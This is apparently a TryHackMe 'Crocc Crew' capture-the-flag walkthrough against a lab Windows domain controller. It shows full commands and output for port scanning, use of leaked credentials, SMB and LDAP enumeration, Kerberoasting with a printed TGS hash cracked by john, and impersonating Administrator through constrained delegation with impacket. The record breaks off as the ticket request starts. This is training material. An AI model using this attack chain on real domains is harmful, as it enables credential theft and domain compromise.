----
Crocc Crew has created a backdoor on a Cooctus Corp Domain Controller. We're calling in the experts to find the real back door!
----

![](https://i.imgur.com/XXcnchz.png)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/d387f5c6b5c2bfd07451dd27c187e185.png)

### Task 2  Hack Back!

﻿**The Crocc Crew Strikes!**  

You just gained initial access into a segmented part of the network and you've found only one device -- A domain controller. It appears that it's already been hacked... Can you find out who did it?

![](https://i.imgur.com/qbQ85Im.png)  

_Check out the Crocc Crew merch on Varg's [Redbubble](https://www.redbubble.com/people/Vargles/explore?page=1&sortOrder=recent)._

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ ping 10.10.175.192                                                  
PING 10.10.175.192 (10.10.175.192) 56(84) bytes of data.
64 bytes from 10.10.175.192: icmp_seq=1 ttl=127 time=286 ms
64 bytes from 10.10.175.192: icmp_seq=2 ttl=127 time=300 ms
^C
--- 10.10.175.192 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1003ms
rtt min/avg/max/mdev = 285.729/292.706/299.683/6.977 ms

┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.175.192 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.175.192:53
Open 10.10.175.192:80
Open 10.10.175.192:88
Open 10.10.175.192:135
Open 10.10.175.192:139
Open 10.10.175.192:389
Open 10.10.175.192:445
Open 10.10.175.192:464
Open 10.10.175.192:593
Open 10.10.175.192:3268
Open 10.10.175.192:3389
Open 10.10.175.192:9389
Open 10.10.175.192:49671
Open 10.10.175.192:49667
Open 10.10.175.192:49668
Open 10.10.175.192:49669
Open 10.10.175.192:49670
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 22:43 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:43
Completed NSE at 22:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:43
Completed NSE at 22:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:43
Completed NSE at 22:43, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 22:43
Completed Parallel DNS resolution of 1 host. at 22:43, 0.02s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:43
Scanning 10.10.175.192 [17 ports]
Discovered open port 3389/tcp on 10.10.175.192
Discovered open port 139/tcp on 10.10.175.192
Discovered open port 53/tcp on 10.10.175.192
Discovered open port 445/tcp on 10.10.175.192
Discovered open port 135/tcp on 10.10.175.192
Discovered open port 80/tcp on 10.10.175.192
Discovered open port 593/tcp on 10.10.175.192
Discovered open port 49668/tcp on 10.10.175.192
Discovered open port 389/tcp on 10.10.175.192
Discovered open port 464/tcp on 10.10.175.192
Discovered open port 3268/tcp on 10.10.175.192
Discovered open port 9389/tcp on 10.10.175.192
Discovered open port 49670/tcp on 10.10.175.192
Discovered open port 49669/tcp on 10.10.175.192
Discovered open port 88/tcp on 10.10.175.192
Discovered open port 49671/tcp on 10.10.175.192
Discovered open port 49667/tcp on 10.10.175.192
Completed Connect Scan at 22:43, 0.40s elapsed (17 total ports)
Initiating Service scan at 22:43
Scanning 17 services on 10.10.175.192
Completed Service scan at 22:44, 56.89s elapsed (17 services on 1 host)
NSE: Script scanning 10.10.175.192.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:44
NSE Timing: About 99.79% done; ETC: 22:44 (0:00:00 remaining)
Completed NSE at 22:44, 41.57s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:44
Completed NSE at 22:44, 3.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:44
Completed NSE at 22:44, 0.00s elapsed
Nmap scan report for 10.10.175.192
Host is up, received user-set (0.20s latency).
Scanned at 2023-06-29 22:43:04 EDT for 102s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-06-30 02:43:12Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: COOCTUS
|   NetBIOS_Domain_Name: COOCTUS
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: COOCTUS.CORP
|   DNS_Computer_Name: DC.COOCTUS.CORP
|   Product_Version: 10.0.17763
|_  System_Time: 2023-06-30T02:44:03+00:00
| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
| Issuer: commonName=DC.COOCTUS.CORP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-29T02:38:17
| Not valid after:  2023-12-29T02:38:17
| MD5:   5630c25111fd1fb81aa47fc421f16038
| SHA-1: 62765024f4d1b03511a8cf97e7012e50b85e2ff2
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQLvfcEI/E47tC6Oju696q3DANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9EQy5DT09DVFVTLkNPUlAwHhcNMjMwNjI5MDIzODE3WhcNMjMx
| MjI5MDIzODE3WjAaMRgwFgYDVQQDEw9EQy5DT09DVFVTLkNPUlAwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQC6e4hDni6oS5bSCboHYrLLbVChEVvKnYaM
| rmNu6wDnFlhWoIfI8FzFdjhwKymDl6plizQ6LBkwQyMUfkvFleTUTl9c1ugTFpgm
| wNd425dSBSZMPMIGb3W4LEHDc7h0cAe6oTegYz6LJ50+mwQ6ea8/U1TZr7R4AnU5
| K5NPyH5sXqibOjyaixF2EZzkWuYRyfNMvIUB1NnU/5aiZ9lsdVK/lgskMf1URZkt
| ZnhBUpB+nWLTx3Q/7DTB8on6+Q+ZarA0CD21Fa8cYN3QwkDBitJlBVa891SWbR0J
| tuhQdG8S3jvVmzkQ0XPZa1eF3aTxMD30uW3VFBpwDg6wcWagjV8dAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAiBprThi/yJ2IpQ48w0tzcO6oU/RiwoUpWIojYQOFbfPlTc4AC6tPZlTu
| lHNM3kQ3e164+tUL97S338nlb3nK2FgqsyCeK6d2wfBHrZLoyANPXutGzFBXTegR
| sOP+c3Z9zQ3D+RulKjtxEDEX3NVmB/eqkvWxdV1kUrSt9V+iIMvuHTse2NgXN0hD
| usFE4XYL01LpWIRvgQsmP9+LdAElTPRfZaKW32VJznpSRD6t8/LdtOCrmcvk2hc9
| baDwwkkqIdx2R4e9sxKJt7BFzAlqIOKCl4CHzvbZsRPI1TITDEyp6Pd+OKOmdqz9
| X50w9t4A6soiCfD3gsMy6OESv9OpUA==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-06-30T02:44:44+00:00; +1s from scanner time.
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20816/tcp): CLEAN (Timeout)
|   Check 2 (port 52689/tcp): CLEAN (Timeout)
|   Check 3 (port 62928/udp): CLEAN (Timeout)
|   Check 4 (port 65279/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2023-06-30T02:44:04
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:44
Completed NSE at 22:44, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:44
Completed NSE at 22:44, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:44
Completed NSE at 22:44, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.43 seconds

http://10.10.175.192/robots.txt

User-Agent: *
Disallow:
/robots.txt
/db-config.bak
/backdoor.php

<script>
$('body').terminal({
    hello: function(what) {
        this.echo('Hello, ' + what +
                  '. Wellcome to this terminal.');
    }
}, {
    greetings: 'CroccCrew >:)'
});
</script>

http://10.10.175.192/db-config.bak

<?php

$servername = "db.cooctus.corp";
$username = "C00ctusAdm1n";
$password = "B4dt0th3b0n3";

// Create connection $conn = new mysqli($servername, $username, $password);

// Check connection if ($conn->connect_error) {
die ("Connection Failed: " .$conn->connect_error);
}

echo "Connected Successfully";

?>

┌──(witty㉿kali)-[~/Downloads]
└─$ rpcclient -U "" 10.10.175.192
Password for [WORKGROUP\]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
┌──(witty㉿kali)-[~/Downloads]
└─$ rpcclient -U% 10.10.175.192
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomains
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege 		0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege 		0:3 (0x0:0x3)
SeLockMemoryPrivilege 		0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege 		0:5 (0x0:0x5)
SeMachineAccountPrivilege 		0:6 (0x0:0x6)
SeTcbPrivilege 		0:7 (0x0:0x7)
SeSecurityPrivilege 		0:8 (0x0:0x8)
SeTakeOwnershipPrivilege 		0:9 (0x0:0x9)
SeLoadDriverPrivilege 		0:10 (0x0:0xa)
SeSystemProfilePrivilege 		0:11 (0x0:0xb)
SeSystemtimePrivilege 		0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege 		0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege 		0:14 (0x0:0xe)
SeCreatePagefilePrivilege 		0:15 (0x0:0xf)
SeCreatePermanentPrivilege 		0:16 (0x0:0x10)
SeBackupPrivilege 		0:17 (0x0:0x11)
SeRestorePrivilege 		0:18 (0x0:0x12)
SeShutdownPrivilege 		0:19 (0x0:0x13)
SeDebugPrivilege 		0:20 (0x0:0x14)
SeAuditPrivilege 		0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege 		0:22 (0x0:0x16)
SeChangeNotifyPrivilege 		0:23 (0x0:0x17)
SeRemoteShutdownPrivilege 		0:24 (0x0:0x18)
SeUndockPrivilege 		0:25 (0x0:0x19)
SeSyncAgentPrivilege 		0:26 (0x0:0x1a)
SeEnableDelegationPrivilege 		0:27 (0x0:0x1b)
SeManageVolumePrivilege 		0:28 (0x0:0x1c)
SeImpersonatePrivilege 		0:29 (0x0:0x1d)
SeCreateGlobalPrivilege 		0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege 		0:31 (0x0:0x1f)
SeRelabelPrivilege 		0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege 		0:33 (0x0:0x21)
SeTimeZonePrivilege 		0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege 		0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege 		0:36 (0x0:0x24)

┌──(witty㉿kali)-[~/Downloads]
└─$ rdesktop -f -u "" 10.10.175.192
Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses and invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.

     Issuer: CN=DC.COOCTUS.CORP


Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate the connection atempt will be aborted:

    Subject: CN=DC.COOCTUS.CORP
     Issuer: CN=DC.COOCTUS.CORP
 Valid From: Wed Jun 28 22:38:17 2023
         To: Thu Dec 28 21:38:17 2023

  Certificate fingerprints:

       sha1: 62765024f4d1b03511a8cf97e7012e50b85e2ff2
     sha256: 8e647bd4f67a2e100231111462848115a32758694a82d7761db3ac1240ca4b36


Do you trust this certificate (yes/no)? yes
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Connection established using SSL.
disconnect: Disconnect initiated by user.

┌──(witty㉿kali)-[~/Downloads]
└─$ crackmapexec smb 10.10.175.192 -u Visitor -p GuestLogin!
SMB         10.10.175.192   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False)
SMB         10.10.175.192   445    DC               [+] COOCTUS.CORP\Visitor:GuestLogin!

┌──(witty㉿kali)-[~/Downloads]
└─$ smbclient -L //10.10.175.192 -U "Visitor"           
Password for [WORKGROUP\Visitor]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Home            Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.175.192 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

┌──(witty㉿kali)-[~/Downloads]
└─$ smbclient //10.10.175.192/Home -U "Visitor"          
Password for [WORKGROUP\Visitor]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jun  8 15:42:53 2021
  ..                                  D        0  Tue Jun  8 15:42:53 2021
  user.txt                            A       17  Mon Jun  7 23:14:25 2021

		15587583 blocks of size 4096. 11430746 blocks available
smb: \> more user.txt 
getting file \user.txt of size 17 as /tmp/smbmore.zPNYd5 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

THM{Gu3st_Pl3as3}

┌──(witty㉿kali)-[~/Downloads]
└─$ smbclient //10.10.175.192/SYSVOL -U "Visitor"
Password for [WORKGROUP\Visitor]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun  7 20:34:33 2021
  ..                                  D        0  Mon Jun  7 20:34:33 2021
  COOCTUS.CORP                       Dr        0  Mon Jun  7 20:34:33 2021

		15587583 blocks of size 4096. 11430697 blocks available
smb: \> cd COOCTUS.CORP\
smb: \COOCTUS.CORP\> ls
  .                                   D        0  Mon Jun  7 20:40:32 2021
  ..                                  D        0  Mon Jun  7 20:40:32 2021
  DfsrPrivate                      DHSr        0  Mon Jun  7 20:40:32 2021
  Policies                            D        0  Mon Jun  7 20:34:38 2021
  scripts                             D        0  Mon Jun  7 20:34:33 2021

		15587583 blocks of size 4096. 11430440 blocks available
smb: \COOCTUS.CORP\> cd DfsrPrivate\
cd \COOCTUS.CORP\DfsrPrivate\: NT_STATUS_ACCESS_DENIED
smb: \COOCTUS.CORP\> ls
  .                                   D        0  Mon Jun  7 20:40:32 2021
  ..                                  D        0  Mon Jun  7 20:40:32 2021
  DfsrPrivate                      DHSr        0  Mon Jun  7 20:40:32 2021
  Policies                            D        0  Mon Jun  7 20:34:38 2021
  scripts                             D        0  Mon Jun  7 20:34:33 2021

		15587583 blocks of size 4096. 11430440 blocks available
smb: \COOCTUS.CORP\> cd Policies\
smb: \COOCTUS.CORP\Policies\> l
  .                                   D        0  Mon Jun  7 20:34:38 2021
  ..                                  D        0  Mon Jun  7 20:34:38 2021
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Mon Jun  7 20:34:38 2021
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Mon Jun  7 20:34:38 2021

		15587583 blocks of size 4096. 11430440 blocks available
smb: \COOCTUS.CORP\Policies\> cd ..\scripts\
smb: \COOCTUS.CORP\scripts\> ls
  .                                   D        0  Mon Jun  7 20:34:33 2021
  ..                                  D        0  Mon Jun  7 20:34:33 2021

		15587583 blocks of size 4096. 11430440 blocks available

**A suffix (also known as a naming context) is a DN that identifies the top entry in a locally held directory hierarchy**.

┌──(witty㉿kali)-[~/Downloads]
└─$ ldapsearch -h
ldapsearch: option requires an argument -- 'h'
ldapsearch: unrecognized option -h
usage: ldapsearch [options] [filter [attributes...]]
where:
  filter	RFC 4515 compliant LDAP search filter
  attributes	whitespace-separated list of attribute descriptions
    which may include:
      1.1   no attributes
      *     all user attributes
      +     all operational attributes
Search options:
  -a deref   one of never (default), always, search, or find
  -A         retrieve attribute names only (no values)
  -b basedn  base dn for search
  -c         continuous operation mode (do not stop on errors)
  -E [!]<ext>[=<extparam>] search extensions (! indicates criticality)
             [!]accountUsability         (NetScape Account usability)
             [!]domainScope              (domain scope)
             !dontUseCopy                (Don't Use Copy)
             [!]mv=<filter>              (RFC 3876 matched values filter)
             [!]pr=<size>[/prompt|noprompt] (RFC 2696 paged results/prompt)
             [!]ps=<changetypes>/<changesonly>/<echg> (draft persistent search)
             [!]sss=[-]<attr[:OID]>[/[-]<attr[:OID]>...]
                                         (RFC 2891 server side sorting)
             [!]subentries[=true|false]  (RFC 3672 subentries)
             [!]sync=ro[/<cookie>]       (RFC 4533 LDAP Sync refreshOnly)
                     rp[/<cookie>][/<slimit>] (refreshAndPersist)
             [!]vlv=<before>/<after>(/<offset>/<count>|:<value>)
                                         (ldapv3-vlv-09 virtual list views)
             [!]deref=derefAttr:attr[,...][;derefAttr:attr[,...][;...]]
             !dirSync=<flags>/<maxAttrCount>[/<cookie>]
                                         (MS AD DirSync)
             [!]extendedDn=<flag>        (MS AD Extended DN
             [!]showDeleted              (MS AD Show Deleted)
             [!]serverNotif              (MS AD Server Notification)
             [!]<oid>[=:<value>|::<b64value>] (generic control; no response handling)
  -f file    read operations from `file'
  -F prefix  URL prefix for files (default: file:///tmp/)
  -l limit   time limit (in seconds, or "none" or "max") for search
  -L         print responses in LDIFv1 format
  -LL        print responses in LDIF format without comments
  -LLL       print responses in LDIF format without comments
             and version
  -M         enable Manage DSA IT control (-MM to make critical)
  -P version protocol version (default: 3)
  -s scope   one of base, one, sub or children (search scope)
  -S attr    sort the results by attribute `attr'
  -t         write binary values to files in temporary directory
  -tt        write all values to files in temporary directory
  -T path    write files to directory specified by path (default: /tmp)
  -u         include User Friendly entry names in the output
  -z limit   size limit (in entries, or "none" or "max") for search
Common options:
  -d level   set LDAP debugging level to `level'
  -D binddn  bind DN
  -e [!]<ext>[=<extparam>] general extensions (! indicates criticality)
             [!]assert=<filter>     (RFC 4528; a RFC 4515 Filter string)
             [!]authzid=<authzid>   (RFC 4370; "dn:<dn>" or "u:<user>")
             [!]bauthzid            (RFC 3829)
             [!]chaining[=<resolveBehavior>[/<continuationBehavior>]]
                     one of "chainingPreferred", "chainingRequired",
                     "referralsPreferred", "referralsRequired"
             [!]manageDSAit         (RFC 3296)
             [!]noop
             ppolicy
             [!]postread[=<attrs>]  (RFC 4527; comma-separated attr list)
             [!]preread[=<attrs>]   (RFC 4527; comma-separated attr list)
             [!]relax
             [!]sessiontracking[=<username>]
             abandon, cancel, ignore (SIGINT sends abandon/cancel,
             or ignores response; if critical, doesn't wait for SIGINT.
             not really controls)
  -H URI     LDAP Uniform Resource Identifier(s)
  -I         use SASL Interactive mode
  -n         show what would be done but don't actually do it
  -N         do not use reverse DNS to canonicalize SASL host name
  -O props   SASL security properties
  -o <opt>[=<optparam>] any libldap ldap.conf options, plus
             ldif_wrap=<width> (in columns, or "no" for no wrapping)
             nettimeout=<timeout> (in seconds, or "none" or "max")
  -Q         use SASL Quiet mode
  -R realm   SASL realm
  -U authcid SASL authentication identity
  -v         run in verbose mode (diagnostics to standard output)
  -V         print version info (-VV only)
  -w passwd  bind password (for simple authentication)
  -W         prompt for bind password
  -x         Simple authentication
  -X authzid SASL authorization identity ("dn:<dn>" or "u:<user>")
  -y file    Read password from file
  -Y mech    SASL mechanism
  -Z         Start TLS request (-ZZ to require successful response)

┌──(witty㉿kali)-[~/Downloads]
└─$ ldapsearch -x -s base namingcontexts -H ldap://10.10.175.192  
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=COOCTUS,DC=CORP
namingcontexts: CN=Configuration,DC=COOCTUS,DC=CORP
namingcontexts: CN=Schema,CN=Configuration,DC=COOCTUS,DC=CORP
namingcontexts: DC=DomainDnsZones,DC=COOCTUS,DC=CORP
namingcontexts: DC=ForestDnsZones,DC=COOCTUS,DC=CORP

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

┌──(witty㉿kali)-[~/Downloads]
└─$ ldapsearch -x -b "DC=COOCTUS,DC=CORP" -H ldap://10.10.175.192 
# extended LDIF
#
# LDAPv3
# base <DC=COOCTUS,DC=CORP> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1

┌──(witty㉿kali)-[~/Downloads]
└─$ ldapsearch -x -b "DC=COOCTUS,DC=CORP" -D "COOCTUS\Visitor" -H ldap://10.10.175.192 -W > ldap_crocccrew.txt  
Enter LDAP Password:

name: admCroccCrew
objectGUID:: ej4EyTrxQECq9t62o8ROGg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132676033890368878
lastLogoff: 0
lastLogon: 132676033917094150
pwdLastSet: 132676009478796916

sAMAccountName: password-reset
sAMAccountType: 805306368
userPrincipalName: password-reset@COOCTUS.CORP
servicePrincipalName: HTTP/dc.cooctus.corp
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=COOCTUS,DC=CORP
dSCorePropagationData: 20210608191453.0Z
dSCorePropagationData: 20210608185942.0Z
dSCorePropagationData: 20210608053540.0Z
dSCorePropagationData: 20210608053303.0Z
dSCorePropagationData: 16010714223649.0Z
lastLogonTimestamp: 132676040955082258
msDS-AllowedToDelegateTo: oakley/DC.COOCTUS.CORP/COOCTUS.CORP
msDS-AllowedToDelegateTo: oakley/DC.COOCTUS.CORP
msDS-AllowedToDelegateTo: oakley/DC
msDS-AllowedToDelegateTo: oakley/DC.COOCTUS.CORP/COOCTUS

┌──(witty㉿kali)-[~/Downloads]
└─$ ldapdomaindump 10.10.175.192 -u "COOCTUS\Visitor" -p 'GuestLogin!'
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

file:///home/witty/Downloads/domain_users.html

Seems that the password-reset account has the flag 'TRUSTED_TO_AUTH_FOR_DELEGATION!' set which confirms our contrained delegation theory.

Using the impacket's find delegation to extract more information about the delegation.

┌──(witty㉿kali)-[~/Downloads]
└─$ impacket-GetUserSPNs COOCTUS.CORP/Visitor:GuestLogin! -request -dc-ip 10.10.175.192
Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra

ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------------  --------  --------------------------  --------------------------  -----------
HTTP/dc.cooctus.corp  password-reset            2021-06-08 18:00:39.356663  2021-06-08 17:46:23.369540  constrained 



[-] CCache file is not found. Skipping...
$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$c329c9963b65eb63d1ada3951158c649$20cc5f4c8c3bb8142cbaae8378d58d9371ff14a851af764212c2513005ae074a8db3b496a86143d16f6a628c259e67f5c04a53d8f02d026f036125396342f5f8fd7a10561285359c6279c42d9b852b760ac01d1ae6708b6b6903340051eda31cbdb16cb4bc3c9e24e0724c2478423d3c8bc1f3f78802234df224acdd12991b6e728fcc2e8e5cc7aadc3ed6d128e0dcff365f3e598a19c2ec4c0e967edf614b71a2f0416c70bd02907b361cb520299441d3e7525e59b62df4eaf23f4ebde1d56098b087b57b071c591804232d87890733d9e8fbcbcd13b0b2ff336ab9e5c599833b5d4b6622a270aa3d47103932efc65e1ae1b994fb2d615c51c15f7c4496c2a5bb80cca04de8daca0af4c69d71c215581deba5320aec75c3ae8103b64eec4da4985f66707257fe1f9ed7389cefff55bbc095ae40cd9c6156498c19d14dda65085f5a3dc438bb1c5323075e55e1eedab76ea9e3097c687553ddda9e43c9ecd1771e4ab61db166f29396303a2b6bb4388295463477c98144f1a60b5ef8e655798f64d999c25490d5241f23f151e54a3cf113d69ff6ed00ee882d2679a28aa7dfce00e2e287f5b7ed2a452c3dba91755448a8357cd1e512d455a20841de8706a27c4915a6cc15d18b0539c74342f9e72822372f1ff62ef072d4756adba80652e1c633bc6f9717153fb3cd8dccc8ed2b120f40af7070b3e6f9df9b254f8bed7403d2afb7fd3430364506bc4edd8abbff318369533a7c44ddcc39701e86dadd8858108d7cfcb7308fe450d62f1b3c39e3cbc6ff1a73d25dbd382237239068e2cd4d7e904904ea6a28bec4863d6d69a5f5d3b1d771534989a840629a182bccfb7287bfa74f8882a55fe98751dd8fe3653f56a8eef5a6cdb4081b464566f96a7d257bbdd42e3227f96dd8eae5278a13b628bfb933f2a55378ced62beaba698cc4662fce0541b879172335da6404f63411ad9840a560f4884b58c2d8d3a50bf907571a785dd9a8efe329767ea43e5bf4b5801688247b83ed339667ba604755e13a5f8312ef5a8cc6c1d7e1f6d7730fb7660563789844212e407994addc26adac469577a66c19f3054c76f2ed5d9465eda2cb13961bc81ebd742291f38c98a5ff8f15580814cf0dc44ad85865b150f7c1757eeec8ac8730927e5133a222c1152bd6b7a6fe7a8b33a88baa42ca9e527cff7c8202dd7b7255e64ae648163294ffa00a39883280c5de412f1b1e3be4223dd69a355bceaa7111fd84db8817bf4f3afff5c87b191765909d4ceea38f056337a8b3aea68c62a7959b752bae56d627a86cfe51e1f38c2c56dfc1906c5291aeb75677b324fb7fbe321c9a5269e4ebe81258

┌──(witty㉿kali)-[~/Downloads]
└─$ nano hash_crocc    
                                                                                                        
┌──(witty㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_crocc 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
resetpassword    (?)     
1g 0:00:00:00 DONE (2023-06-30 00:07) 3.571g/s 844800p/s 844800c/s 844800C/s rikelme..pink panther
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

Using the impacket's find delegation to extract more information about the delegation.

┌──(witty㉿kali)-[~/Downloads]
└─$ impacket-findDelegation -debug COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.10.175.192
Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra

[+] Impacket Library Installation Path: /usr/local/lib/python3.11/dist-packages/impacket
[+] Connecting to 10.10.175.192, port 389, SSL False
[+] Total of records returned 4
AccountName     AccountType  DelegationType                      DelegationRightsTo                  
--------------  -----------  ----------------------------------  -----------------------------------
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS.CORP 
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP              
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC                           
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS      
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC/COOCTUS    

Using the impacket's getST script to impersonate and get the ticket of the Administrator user.  
If the account is configured with constrained delegation (with protocol transition), we can request service tickets for other users, assuming the target SPN is allowed for delegation

┌──(witty㉿kali)-[~/Downloads]
└─$ impacket-getST -spn oakley/DC.COOCTUS.CORP -impersonate Administrator "COOCTUS.CORP/password-reset:resetpassword" -dc-ip 10.10.175.192
Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
